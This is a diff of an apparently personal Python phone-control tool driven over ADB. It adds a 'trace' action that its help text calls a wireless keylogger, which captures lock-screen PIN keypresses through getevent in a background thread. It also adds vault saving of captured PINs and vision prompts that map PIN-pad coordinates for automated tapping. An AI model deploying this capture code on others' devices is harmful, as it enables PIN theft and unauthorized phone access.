+            f"   • Phone unlocked via biometric (fingerprint/face)\n"
+            f"   • PIN pad wasn't on screen\n"
+            f"   • getevent couldn't read the input device\n"
+            f"   Try again: phone unlock capture <answer>"
+        )
+
+    # ── PIN captured ──
+    pin = "".join(raw_events)
+    count = len(raw_events)
+    type_label = f"{pin_type.upper()}" if pin_type and pin_type != "unknown" else "PIN"
+    length_info = f", {pin_length} digits" if pin_length > 0 else ""
+    result = (f"🔑 Captured {type_label}: {pin} ({count} digit{'s' if count != 1 else ''}" 
+              f"{length_info}) in {elapsed}s")
+
+    # Auto-save to vault if requested
+    if auto_save and answer:
+        try:
+            from actions.phone_unlock import (
+                _verify, _save_vault, _encrypt_vault, _CRYPTO_OK
+            )
+        except ImportError:
+            result += ("\n\nVault not available for auto-save — "
+                       "save manually with: phone unlock save "
+                       f"{pin} <answer>")
+            return result
+        ok, msg = _verify(answer)
+        if not ok:
+            result += f"\n\n⛔ Vault save blocked: {msg}"
+            return result
+        if not _CRYPTO_OK:
+            result += ("\n\nThe cryptography library isn't available — "
+                       "save manually with: phone unlock save "
+                       f"{pin} <answer>")
+            return result
+        kind = "PIN" if pin.isdigit() else "password"
+        phone_name = _get_phone_name()
+        payload = {
+            "kind": kind, "pin": pin,
+            "device": phone_name,
+            "note": f"captured via getevent trace on {phone_name} at "
+                     f"{time.strftime('%Y-%m-%d %H:%M')}",
+            "saved_at": time.strftime("%Y-%m-%d %H:%M"),
+        }
+        _save_vault(_encrypt_vault(payload, answer))
+        result += ("\n🔐 Saved to the encrypted vault for "
+                   f"{phone_name} — say 'phone unlock <answer>' to retrieve.")
+        return result
+
+    result += (
+        f"\n\nTo save this to the vault: phone unlock save {pin} "
+        "<answer>"
+    )
+    return result
+
+
+# ── Live trace: continuous background PIN capture ──────────────────────────
+# Runs getevent in a daemon thread, continuously watching for digit
+# keycodes. When a burst of digits arrives (followed by a 2s pause), it
+# logs it as a captured PIN entry. The user can start/stop/check status
+# without blocking the CLI/daemon.
+
+class _LiveTrace:
+    """Background PIN capture via getevent. Runs a daemon thread that
+    watches for digit keycodes and logs PIN sequences (detected by a 2s
+    gap between digits).
+
+    Usage:
+        live_trace.start(target)   → start capturing in background
+        live_trace.stop()          → stop and clean up
+        live_trace.status()        → show captured PINs + running state
+        live_trace.pins            → list of {pin, time, digits} dicts
+    """
+
+    def __init__(self):
+        self._proc: subprocess.Popen | None = None
+        self._thread: threading.Thread | None = None
+        self._stop_event = threading.Event()
+        self._pins: list[dict] = []
+        self._target: str = ""
+        self._started_at: float = 0.0
+        self._lock = threading.Lock()
+        self._current_seq: list[str] = []
+        self._last_digit_time: float = 0.0
+        self._pin_timeout: float = 2.0  # seconds gap = new PIN
+
+    @property
+    def pins(self) -> list[dict]:
+        with self._lock:
+            return list(self._pins)
+
+    @property
+    def running(self) -> bool:
+        return self._thread is not None and self._thread.is_alive()
+
+    def start(self, target: str = "") -> str:
+        """Start continuous PIN capture in a daemon thread."""
+        if self.running:
+            return ("Trace is already running — say 'phone trace status' "
+                    "to see captured PINs, or 'phone trace stop' to stop.")
+        target = target or _target() or ""
+        if not target:
+            return "No phone connected — run 'phone connect' first."
+        self._target = target
+        self._stop_event.clear()
+        with self._lock:
+            self._pins = []
+        self._started_at = time.time()
+        self._thread = threading.Thread(
+            target=self._run, daemon=True, name="LiveTraceThread"
+        )
+        self._thread.start()
+        return ("📡 Live trace started — watching for PIN entries in the "
+                "background. Enter your PIN on the lock screen (phone taps, "
+                "phone tap, or scrcpy). Say 'phone trace status' to see "
+                "captured PINs, 'phone trace stop' to stop.")
+
+    def stop(self) -> str:
+        """Stop the live trace and clean up."""
+        self._stop_event.set()
+        if self._proc:
+            try:
+                self._proc.send_signal(
+                    subprocess.CTRL_C_EVENT if os.name == "nt" else 2
+                )
+            except Exception:
+                pass
+            try:
+                self._proc.kill()
+            except Exception:
+                pass
+            self._proc = None
+        if self._thread and self._thread.is_alive():
+            self._thread.join(timeout=5)
+        self._thread = None
+        # Flush any in-progress digit sequence
+        self._flush_sequence()
+        count = len(self._pins)
+        elapsed = int(time.time() - self._started_at) if self._started_at else 0
+        mins, secs = divmod(elapsed, 60)
+        return ("📡 Live trace stopped. "
+                f"Ran for {mins}m{secs}s, captured {count} PIN "
+                f"entr{'y' if count == 1 else 'ies'}." +
+                (" Say 'phone trace status' to review." if count else ""))
+
+    def status(self) -> str:
+        """Show current state and captured PINs."""
+        if not self.running and not self._pins:
+            return ("📡 No live trace running and no PINs captured. "
+                    "Say 'phone trace live' to start.")
+        elapsed = int(time.time() - self._started_at) if self._started_at else 0
+        mins, secs = divmod(elapsed, 60)
+        lines = [f"📡 Live trace: {'RUNNING' if self.running else 'STOPPED'} "
+                 f"({mins}m{secs}s elapsed)"]
+        pins = self.pins
+        if pins:
+            lines.append(f"🔑 Captured {len(pins)} PIN entr{'y' if len(pins) == 1 else 'ies'}:")
+            for i, p in enumerate(pins, 1):
+                ts = p.get("time", "")
+                pin = p.get("pin", "")
+                digits = p.get("digits", 0)
+                lines.append(
+                    f"  {i}. [{ts}] {pin} ({digits} digit{'s' if digits != 1 else ''})"
+                )
+            lines.append(
+                "\nTo save the last PIN to the vault: "
+                "phone unlock save <pin> <answer>")
+        else:
+            lines.append("  (no PINs captured yet — enter your PIN on the lock screen)")
+        return "\n".join(lines)
+
+    def _run(self):
+        """Background thread: run getevent and parse digit keycodes."""
+        try:
+            dev_check = _run_adb(
+                ["shell", "ls", "/dev/input/"], target=self._target, timeout=5
+            ).stdout or ""
+        except Exception:
+            dev_check = ""
+        devices = [
+            d.strip() for d in dev_check.splitlines()
+            if d.strip().startswith("event")
+        ]
+        if not devices:
+            return
+        dev_paths = [f"/dev/input/{d}" for d in devices[:8]]
+        cmd = ["shell", "getevent"] + dev_paths
+        try:
+            self._proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                text=True, **subprocess_no_window_kwargs(),
+            )
+        except Exception:
+            return
+        try:
+            for line in self._proc.stdout:
+                if self._stop_event.is_set():
+                    break
+                line = line.strip()
+                if not line:
+                    continue
+                m = re.match(
+                    r".*?EV_KEY\s+(KEYCODE_\d+)\s+DOWN", line, re.IGNORECASE
+                )
+                if not m:
+                    continue
+                keycode_num = int(m.group(1).upper().replace("KEYCODE_", ""))
+                if keycode_num not in _KEYCODE_TO_DIGIT:
+                    continue
+                digit = _KEYCODE_TO_DIGIT[keycode_num]
+                now = time.time()
+                with self._lock:
+                    # If gap > timeout, flush old sequence and start new
+                    if (self._current_seq and
+                            now - self._last_digit_time > self._pin_timeout):
+                        self._flush_sequence()
+                    self._current_seq.append(digit)
+                    self._last_digit_time = now
+        except Exception:
+            pass
+        finally:
+            if self._proc:
+                try:
+                    self._proc.kill()
+                except Exception:
+                    pass
+                self._proc = None
+
+    def _flush_sequence(self) -> None:
+        """If there's a pending digit sequence, log it as a captured PIN."""
+        if self._current_seq:
+            pin = "".join(self._current_seq)
+            self._pins.append({
+                "pin": pin,
+                "digits": len(self._current_seq),
+                "time": time.strftime("%H:%M:%S"),
+            })
+            self._current_seq = []
+
+
+# Singleton — lives for the process lifetime
+live_trace = _LiveTrace()
+
+
+def _action_trace_live(sub: str = "") -> str:
+    """Start/stop/status for continuous background PIN capture.
+    Sub-commands:
+        trace live / trace start  → start capturing
+        trace stop                → stop capturing
+        trace status              → show captured PINs
+    """
+    sub = (sub or "live").strip().lower()
+    if sub in ("stop", "off", "end"):
+        return live_trace.stop()
+    if sub in ("status", "show", "pins", "list"):
+        return live_trace.status()
+    # Default: start
+    return live_trace.start()
+
+
+# ── PIN pad vision: OCR the lock screen layout via screenshot + LLM ────────
+# Takes a screenshot of the lock screen, sends it to the vision model with
+# a targeted prompt, and extracts the PIN pad button coordinates or reads
+# the lock screen state (how many dots are lit, what's on screen).
+#
+# IMPORTANT caveat: Android's FLAG_SECURE prevents screencap from capturing
+# the actual lock screen on many phones (you get a black frame). This works
+# on lock screens WITHOUT FLAG_SECURE (most stock Android, Samsung, older
+# MIUI) and on lock screen variants where the PIN pad is part of the system
+# UI (not an app). scrcpy mirrors the screen differently and CAN capture
+# locked screens on some devices.
+
+_PINPAD_VISION_PROMPT = """You are analyzing a phone lock screen screenshot.
+Your task is to identify the numeric PIN pad (keypad with digits 0-9).
+
+Return EXACTLY this JSON format (no markdown, no explanation):
+{
+  "screen_width": <number>,
+  "screen_height": <number>,
+  "on_lock_screen": true/false,
+  "pin_pad_visible": true/false,
+  "buttons": {
+    "1": {"x": <center_x>, "y": <center_y>},
+    "2": {"x": <center_x>, "y": <center_y>},
+    "3": {"x": <center_x>, "y": <center_y>},
+    "4": {"x": <center_x>, "y": <center_y>},
+    "5": {"x": <center_x>, "y": <center_y>},
+    "6": {"x": <center_x>, "y": <center_y>},
+    "7": {"x": <center_x>, "y": <center_y>},
+    "8": {"x": <center_x>, "y": <center_y>},
+    "9": {"x": <center_x>, "y": <center_y>},
+    "0": {"x": <center_x>, "y": <center_y>}
+  },
+  "dot_count": <number of filled dots at the top, or 0 if none>,
+  "description": "brief 1-sentence description of what's on screen"
+}
+
+Coordinates are in pixels from the top-left corner. Measure carefully —
+these will be used to tap the buttons via ADB.
+"""
+
+_PINPAD_STATE_PROMPT = """You are analyzing a phone lock screen screenshot.
+Focus on the PIN entry area (numeric keypad + dot indicators).
+
+Return EXACTLY this JSON format (no markdown, no explanation):
+{
+  "on_lock_screen": true/false,
+  "dot_count": <number of filled dots (0-10)>,
+  "dot_positions": [{"x": <x>, "y": <y>}, ...],
+  "emergency_button": {"x": <x>, "y": <y>} or null,
+  "backspace_button": {"x": <x>, "y": <y>} or null,
+  "keyboard_visible": true/false,
+  "description": "what's on screen right now"
+}
+"""
+
+
+def _vision_analyze(image_bytes: bytes, mime: str, prompt: str) -> str:
+    """Send an image to the vision model (Groq/GitHub) with a specific prompt.
+    Returns the model's text response. Wraps _analyze_still from the vision
+    module so phone_control doesn't need to know about the LLM client."""
+    try:
+        from actions.screen_processor import _analyze_still
+        return _analyze_still(image_bytes, mime, prompt)
+    except Exception as e:
+        return f""  
+
+
+def _parse_json_response(text: str) -> dict | None:
+    """Extract a JSON object from a vision model's response, handling markdown
+    code fences and leading/trailing garbage."""
+    text = (text or "").strip()
+    # Strip markdown code fences
+    if "```" in text:
+        m = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", text, re.DOTALL)
+        if m:
+            text = m.group(1)
+    # Find the first { ... }
+    start = text.find("{")
+    end = text.rfind("}")
+    if start >= 0 and end > start:
+        text = text[start:end + 1]
+    try:
+        return json.loads(text)
+    except Exception:
+        return None
+
+
+def _action_pinpad_map() -> str:
+    """Screenshot + vision: map the PIN pad button coordinates on the lock
+    screen. Returns the exact pixel coordinates of each digit button (0-9)
+    so they can be used with 'phone tap' for precise automated entry."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    # Take a screenshot
+    try:
+        r = _run_adb(["exec-out", "screencap", "-p"], timeout=30,
+                     target=target, binary=True)
+    except Exception as e:
+        return f"Screenshot failed: {e}"
+    if r.returncode != 0 or not r.stdout:
+        return "Screenshot failed — the phone returned nothing."
+    data = r.stdout
+    if not data.startswith(b"\x89PNG"):
+        return "Screenshot failed — unexpected format from the phone."
+    # Save for reference
+    d = Path("phone_shots")
+    d.mkdir(parents=True, exist_ok=True)
+    path = d / f"pinpad_{time.strftime('%Y%m%d_%H%M%S')}.png"
+    path.write_bytes(data)
+    # Send to vision model
+    print("🔍 Analyzing lock screen with vision model...")
+    reply = _vision_analyze(data, "image/png", _PINPAD_VISION_PROMPT)
+    parsed = _parse_json_response(reply)
+    if not parsed or not parsed.get("pin_pad_visible"):
+        desc = parsed.get("description", "") if parsed else (reply[:200] if reply else "no response")
+        return (
+            f"📸 Screenshot saved: {path}\n"
+            f"🔍 Vision says: {desc}\n"
+            f"\nPIN pad not detected. Possible reasons:\n"
+            f"  • The lock screen uses FLAG_SECURE (screencap returns black)\n"
+            f"  • The phone isn't on the lock screen (unlock it first)\n"
+            f"  • The PIN pad has an unusual layout the model couldn't parse\n"
+            f"\nTip: try 'phone screen' (scrcpy) which can mirror locked screens,"
+            f"\nthen take a screenshot of the scrcpy window instead."
+        )
+    buttons = parsed.get("buttons", {})
+    w = parsed.get("screen_width", "?")
+    h = parsed.get("screen_height", "?")
+    lines = [
+        f"📸 PIN pad mapped from: {path}",
+        f"📐 Screen: {w}x{h}",
+        f"🔢 Digit button coordinates (tap with 'phone tap X Y'):"
+    ]
+    for digit in "1234567890":
+        btn = buttons.get(digit, {})
+        x, y = btn.get("x"), btn.get("y")
+        if x is not None and y is not None:
+            lines.append(f"  {digit}: ({x}, {y})")
+        else:
+            lines.append(f"  {digit}: (not detected)")
+    lines.append(f"\n💡 Use these with 'phone tap <x> <y>' to enter the PIN precisely.")
+    return "\n".join(lines)
+
+
+def _action_pinpad_observe() -> str:
+    """Screenshot + vision: read the current lock screen state — how many
+    dots are filled, what buttons are visible, and what's on screen. Useful
+    for verifying PIN entry progress (e.g., after each digit tap)."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        r = _run_adb(["exec-out", "screencap", "-p"], timeout=30,
+                     target=target, binary=True)
+    except Exception as e:
+        return f"Screenshot failed: {e}"
+    if r.returncode != 0 or not r.stdout:
+        return "Screenshot failed — the phone returned nothing."
+    data = r.stdout
+    if not data.startswith(b"\x89PNG"):
+        return "Screenshot failed — unexpected format from the phone."
+    d = Path("phone_shots")
+    d.mkdir(parents=True, exist_ok=True)
+    path = d / f"pinpad_obs_{time.strftime('%Y%m%d_%H%M%S')}.png"
+    path.write_bytes(data)
+    print("🔍 Observing lock screen state...")
+    reply = _vision_analyze(data, "image/png", _PINPAD_STATE_PROMPT)
+    parsed = _parse_json_response(reply)
+    if not parsed:
+        desc = (reply[:300] if reply else "no response")
+        return f"📸 Screenshot saved: {path}\n🔍 Could not parse: {desc}"
+    lines = [f"📸 Lock screen observation: {path}"]
+    on_lock = parsed.get("on_lock_screen", False)
+    dots = parsed.get("dot_count", 0)
+    lines.append(f"🔒 On lock screen: {'yes' if on_lock else 'no'}")
+    lines.append(f"🔵 Dots filled: {dots}")
+    dot_pos = parsed.get("dot_positions", [])
+    if dot_pos:
+        lines.append(f"   Dot positions: {', '.join(f'({d.get("x")},{d.get("y")})' for d in dot_pos)}")
+    kb = parsed.get("keyboard_visible", False)
+    lines.append(f"⌨️ Keyboard visible: {'yes' if kb else 'no'}")
+    emergency = parsed.get("emergency_button")
+    if emergency:
+        lines.append(f"🆘 Emergency: ({emergency.get('x')}, {emergency.get('y')})")
+    backspace = parsed.get("backspace_button")
+    if backspace:
+        lines.append(f"⌫ Backspace: ({backspace.get('x')}, {backspace.get('y')})")
+    desc = parsed.get("description", "")
+    if desc:
+        lines.append(f"📝 {desc}")
+    return "\n".join(lines)
+
+
 # ── Tool entry point ─────────────────────────────────────────────────────────
 
 def phone_control(parameters: dict, player=None) -> str:
     """Tool dispatcher. Actions:
       status      — connection state (USB/wireless) + phone info
+      devices     — every phone adb sees (USB + wireless, state, model)
       connect     — one-time USB→wireless setup (then it's cable-free)
       info        — model, Android version, battery, screen, storage
+      screen      — LIVE mirror + control via scrcpy (Phantom Droid-style)
       screenshot  — capture the screen (analyze=true → Jeeves describes it)
+      logcat      — recent phone logs (lines=, query=)
+      wifi/network/report/top/storage — read-only diagnostics
+      trace       — wireless keylogger: one-shot (duration=) or live/start/stop/status for background capture
+      pinpad_map  — screenshot + vision: map PIN pad button coordinates
+      pinpad      — screenshot + vision: observe lock screen state (dots, buttons)
       ring        — find-my-phone: ring at max volume (seconds=, stop=true)
       tap/swipe/text/key — control the screen (pixel coords; key=home/back/...)
       apps/launch/stop  — list (query=), open, force-stop apps by package
@@ -1556,11 +2864,53 @@ def phone_control(parameters: dict, player=None) -> str:
 
     if action in ("status", "state"):
         return _action_status()
-    if action in ("connect", "wireless", "wifi", "reconnect"):
+    if action in ("connect", "wireless", "reconnect"):
         return _action_connect(int(params.get("port", 5555) or 5555))
+    if action == "pair":
+        return _action_pair(params.get("code") or params.get("pairing_code"),
+                           params.get("ip") or params.get("address") or params.get("target"))
     if action in ("info", "device"):
         return _action_info()
-    if action in ("screenshot", "screen", "shot"):
+    if action == "devices":
+        return _action_devices()
+    if action == "screen":
+        return _action_screen()
+    if action == "logcat":
+        return _action_logcat(params.get("lines"), params.get("query") or "")
+    if action == "wifi":
+        return _action_wifi()
+    if action == "network":
+        return _action_network()
+    if action == "top":
+        return _action_top(params.get("limit"))
+    if action == "storage":
+        return _action_storage()
+    if action == "report":
+        return _action_report()
+    # ── Hidden tools: authorization gate ──
+    if action in _HIDDEN_ACTIONS or action == "trace":
+        auth_err = _check_hidden_auth(params)
+        if auth_err:
+            return auth_err
+
+    if action == "trace":
+        trace_mode = str(params.get("mode") or "").strip().lower()
+        # Sub-commands: live/start/stop/status → background mode
+        if trace_mode in ("live", "start", "stop", "off", "end",
+                          "status", "show", "pins", "list"):
+            return _action_trace_live(trace_mode)
+        # Default: one-shot capture
+        return _action_trace(
+            params.get("duration"),
+            auto_save=str(params.get("save", "")).lower()
+            in ("1", "true", "yes"),
+            answer=str(params.get("answer") or ""),
+        )
+    if action == "pinpad_map":
+        return _action_pinpad_map()
+    if action in ("pinpad_observe", "pinpad_read", "pinpad"):
+        return _action_pinpad_observe()
+    if action in ("screenshot", "shot"):
         analyze = str(params.get("analyze", "")).lower() in ("1", "true", "yes")
         return _action_screenshot(analyze=analyze,
                                   text=str(params.get("text") or ""))
@@ -1618,9 +2968,14 @@ def phone_control(parameters: dict, player=None) -> str:
                     "actions/phone_unlock.py, a local-only file kept out "
                     "of git).")
         return phone_unlock(params)
-    return ("Unknown phone action. Try: status | connect | info | screenshot "
-            "| ring [seconds] | unlock | dev [on|off|status] | termux "
-            "[status|setup|start|stop|<cmd>] | notify '<text>' | battery | "
-            "tap x y | swipe x1 y1 x2 y2 | text '...' | key home | apps | "
-            "launch pkg | stop pkg | files | pull remote | push local remote | "
-            "shell 'cmd' | macro <name>")
+    return ("Unknown phone action. Try: status | devices | connect | "
+            "pair <code> <ip:port> (Android 11+ wireless debugging) | "
+            "info | screen (live mirror) | screenshot | logcat [lines] | "
+            "wifi | network | report | top | storage | "
+            "trace [live|stop|status] (getevent PIN capture) | "
+            "pinpad_map (vision: map PIN pad coords) | "
+            "pinpad (vision: observe lock screen) | ring [seconds] | unlock | "
+            "dev [on|off|status] | termux [status|setup|start|stop|<cmd>] | "
+            "notify '<text>' | battery | tap x y | swipe x1 y1 x2 y2 | "
+            "text '...' | key home | apps | launch pkg | stop pkg | files | "
+            "pull remote | push local remote | shell 'cmd' | macro <name>")
